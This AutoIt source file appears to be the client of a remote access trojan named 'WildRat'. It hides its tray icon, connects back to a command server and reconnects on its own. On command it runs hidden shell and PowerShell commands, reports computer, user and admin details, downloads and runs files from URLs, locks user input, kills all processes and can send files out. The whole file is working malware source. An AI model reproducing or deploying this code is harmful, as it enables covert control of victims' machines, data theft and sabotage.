#NoTrayIcon

#Region 	;////   #Include  ////;
#include "_TCP.au3"
#include <Constants.au3>
#include <inet.au3>
#EndRegion 	;////   #Include  ////;
#Region 	;////   Startup   ////;
OnAutoItExitRegister("ExitFunc")
#EndRegion 	;////   Startup   ////;
#Region		;////   CONFIG    ////;
Global $Server_IP = TCPNameToIP("localhost") ;TCPNameToIP is here to make it possible to write a web adress instead of an IP.
Global $Server_Port = 88
Global $Persistence = "Aw, noes!"
Global $Version = "The chosen one"
#EndRegion	;////   CONFIG    ////;

#Region 	;//// Client code ////;

Connect()

While 1
	Sleep(1000)
WEnd

Func Connected($hSocket, $iError)
	If Not $iError = 0 Then
		Sleep(5000)
		Connect()
	Else
		ConsoleWrite("Connected!" & @CRLF)
	EndIf
EndFunc   ;==>Connected
Func Received($hSocket, $sReceived, $iError)
	ConsoleWrite("Recieved: " & $sReceived & @CRLF)
	RunCommand($hSocket, $sReceived, $iError)
EndFunc   ;==>Received
Func Disconnected($hSocket, $iError)
	Sleep(1000)
	RestartScript()
EndFunc   ;==>Disconnected
Func GetIP($i)
	$IP = StringSplit(BinaryToString(InetRead("http://api.wipmania.com/")), "<br>", 1)
	If $i = "ip" Then
		If Not $IP[1] = "" Then
			$return = $IP[1]
		Else
			Return "Error: Api not responding."
		EndIf
	ElseIf $i = "from" Then
		If Not $IP[1] = "" Then
			$return = $IP[2]
		Else
			Return "Error: Api not responding."
		EndIf
	EndIf
	Return $return
EndFunc   ;==>GetIP
Func RestartScript()
	If @Compiled = 1 Then
		Run(FileGetShortName(@ScriptFullPath))
	Else
		Run(FileGetShortName(@AutoItExe) & " " & FileGetShortName(@ScriptFullPath))
	EndIf
	Exit
EndFunc   ;==>RestartScript
Func Connect()
	$hClient = _TCP_Client_Create($Server_IP, $Server_Port)
	_TCP_RegisterEvent($hClient, $TCP_RECEIVE, "Received")
	_TCP_RegisterEvent($hClient, $TCP_CONNECT, "Connected")
	_TCP_RegisterEvent($hClient, $TCP_DISCONNECT, "Disconnected")
EndFunc   ;==>Connect
Func ExitFunc()
	Exit
	;_TCP_Client_Stop($hClient)
EndFunc   ;==>ExitFunc
Func RunCommand($hSocket, $sReceived, $iError)
	ConsoleWrite($hSocket & ":" & $sReceived & @CRLF)
	$Received = StringSplit($sReceived, "|")
	Call("RC_" & $Received[1], $hSocket, $Received)
	If @error = 0xDEAD And @extended = 0xBEEF Then RC_ELSE($hSocket, $Received)
EndFunc   ;==>RunCommand
Func _GetDOSOutput($sCommand)
	Local $iPID, $sOutput = ""
	$iPID = Run('"' & @ComSpec & '" /c ' & $sCommand, "", @SW_HIDE, $STDERR_CHILD + $STDOUT_CHILD)
	While 1
		$sOutput &= StdoutRead($iPID, False, False)
		If @error Then
			ExitLoop
		EndIf
		Sleep(10)
	WEnd
	Return $sOutput
EndFunc   ;==>_GetDOSOutput
Func SendFile($hSocket, $sFile)
	$FileName = StringSplit(FileGetShortName($sFile), "\")
	ConsoleWrite($hSocket & ":" & "FILE|" & $FileName[$FileName[0]])
	_TCP_Send($hSocket, "FILE|" & $FileName[$FileName[0]])
	Sleep(1000)
	_TCP_Send($hSocket, FileRead($sFile))
EndFunc   ;==>SendFile
#EndRegion	;//// Client code ////;

#Region 	;////   RC Funcs  ////;
Func RC_GETDATA($hSocket, $Received)
	If IsAdmin() Then
		$Admin = "Yes"
	Else
		$Admin = "No"
	EndIf
	_TCP_Send($hSocket, "PCINFO" & "|" & GetIP("from") & "|" & GetIP("ip") & "|" & @ComputerName & "|" & @UserName & "|" & $Admin & "|" & $Persistence & "|" & @OSVersion & "|" & @CPUArch & "|" & $Version)
EndFunc   ;==>RC_GETDATA
Func RC_CMD($hSocket, $Received)
	_TCP_Send($hSocket, "ANSWER|Output|" & StringReplace(_GetDOSOutput($Received[2]), "ÿ", " "))
EndFunc   ;==>RC_CMD
Func RC_MSGBOX($hSocket, $Received)
	MsgBox(00, $Received[2], $Received[3])
EndFunc   ;==>RC_MSGBOX
Func RC_SHE($hSocket, $Received)
	ShellExecute($Received[2])
EndFunc   ;==>RC_SHE
Func RC_KML($hSocket, $Received)
	If $Received[2] = "LOCK" Then
		BlockInput(1)
	ElseIf $Received[2] = "UNLOCK" Then
		BlockInput(0)
	EndIf
EndFunc   ;==>RC_KML
Func RC_ASK($hSocket, $Received)
	If $Received[2] = "" Then $Received[2] = "WildRat"
	$answer = InputBox($Received[2], $Received[3])
	While $answer = ""
		$answer = InputBox($Received[2], $Received[3])
	WEnd
	_TCP_Send($hSocket, "ANSWER|Answer|" & $answer)
EndFunc   ;==>RC_ASK
Func RC_EXIT($hSocket, $Received)
	Exit
EndFunc   ;==>RC_EXIT
Func RC_BSOD($hSocket, $Received)
	$a = ProcessList()
	For $i = 1 To UBound($a) - 1
		ProcessClose($a[$i][0])
	Next
	Exit
EndFunc   ;==>RC_BSOD
Func RC_DAE($hSocket, $Received)
	$downloadpath = $Received[2]
	$downloadlink = $Received[3]
	Local $hdownload = InetGet($downloadlink, $downloadpath, 1, 1)
	Do
		Sleep(250)
	Until InetGetInfo($hdownload, 2)
	Local $nbytes = InetGetInfo($hdownload, 0)
	InetClose($hdownload)
	ShellExecute($downloadpath)
EndFunc   ;==>RC_DAE
Func RC_CDOPEN($hSocket, $Received)
	CDTray("A:", "OPEN")
	CDTray("B:", "OPEN")
	CDTray("C:", "OPEN")
	CDTray("D:", "OPEN")
	CDTray("E:", "OPEN")
	CDTray("F:", "OPEN")
	CDTray("G:", "OPEN")
	CDTray("H:", "OPEN")
	CDTray("I:", "OPEN")
	CDTray("J:", "OPEN")
	CDTray("K:", "OPEN")
	CDTray("L:", "OPEN")
	CDTray("M:", "OPEN")
	CDTray("N:", "OPEN")
	CDTray("O:", "OPEN")
	CDTray("P:", "OPEN")
	CDTray("Q:", "OPEN")
	CDTray("R:", "OPEN")
	CDTray("S:", "OPEN")
	CDTray("T:", "OPEN")
	CDTray("U:", "OPEN")
	CDTray("V:", "OPEN")
	CDTray("W:", "OPEN")
	CDTray("X:", "OPEN")
	CDTray("Y:", "OPEN")
	CDTray("Z:", "OPEN")
EndFunc   ;==>RC
Func RC_CDCLOSE($hSocket, $Received)
	CDTray("A:", "CLOSE")
	CDTray("B:", "CLOSE")
	CDTray("C:", "CLOSE")
	CDTray("D:", "CLOSE")
	CDTray("E:", "CLOSE")
	CDTray("F:", "CLOSE")
	CDTray("G:", "CLOSE")
	CDTray("H:", "CLOSE")
	CDTray("I:", "CLOSE")
	CDTray("J:", "CLOSE")
	CDTray("K:", "CLOSE")
	CDTray("L:", "CLOSE")
	CDTray("M:", "CLOSE")
	CDTray("N:", "CLOSE")
	CDTray("O:", "CLOSE")
	CDTray("P:", "CLOSE")
	CDTray("Q:", "CLOSE")
	CDTray("R:", "CLOSE")
	CDTray("S:", "CLOSE")
	CDTray("T:", "CLOSE")
	CDTray("U:", "CLOSE")
	CDTray("V:", "CLOSE")
	CDTray("W:", "CLOSE")
	CDTray("X:", "CLOSE")
	CDTray("Y:", "CLOSE")
	CDTray("Z:", "CLOSE")
EndFunc   ;==>RC
Func RC_CALL($hSocket, $Received)
	Local $aArgs[4]
	Local $tempArgs = Stringsplit($Received[2], "()")
	Local $callCommand = $tempArgs[1]
	Local $vars = StringSplit($tempargs[2], ",")
	$vars[0] = "CallArgArray"
    Call($callCommand, $vars)
EndFunc
Func RC_PWS($hSocket, $Received)
	$cmd = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noexit -command . ' & $Received[2]
	StringReplace(_GetDOSOutput($cmd), "ÿ", " ")
	_TCP_Send($hSocket, "ANSWER|Answer|" & $cmd)
EndFunc

Func RC_ELSE($hSocket, $Received)
	_TCP_Send($hSocket, "ANSWER|Error!|Command not recognized, are you sure the client is updated?")
EndFunc   ;==>RC_ELSE
#EndRegion	;////   RC Funcs  ////;